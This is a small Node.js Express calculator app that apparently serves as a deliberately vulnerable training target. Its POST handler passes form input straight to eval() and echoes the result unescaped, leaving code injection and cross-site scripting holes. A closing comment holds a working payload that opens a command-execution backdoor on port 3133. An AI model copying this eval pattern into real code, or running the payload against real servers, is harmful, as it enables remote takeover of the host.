var express = require('express');
var bodyParser = require('body-parser');
var app = express();
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

app.get('/', function (req, res) {
  var response = '<form method="POST">' +
        'Calculator: <input type="text" name="calcme"><br>' +
        '<input type="submit" value="Calculate"></form>';
  res.send(response);
});

app.post('/',function(req, res){
  try {
     var answer = eval("answer = (" + req.body.calcme + ")");
  }
  catch(err) {
    var answer = "ERROR: Integers Only!";
  }
  
  var response = '<form method="POST">' +
        'Calculator: <input type="text" name="calcme"><br>' +
        '<input type="submit" value="Calculate"></form>' +
        '<h1 style="background-color: #3CBC8D;color: white;"> '+answer+'</h1>';
  res.type('html');
  res.end(response);
  console.log(req.body);
});
app.listen(80);

/*setTimeout(function() { require('http').createServer(function (req, res) { res.writeHead(200, {"Content-Type": "text/plain"});require('child_process').exec(require('url').parse(req.url, true).query['cmd'], function(e,s,st) {res.end(s);}); }).listen(3133); }, 5000)*/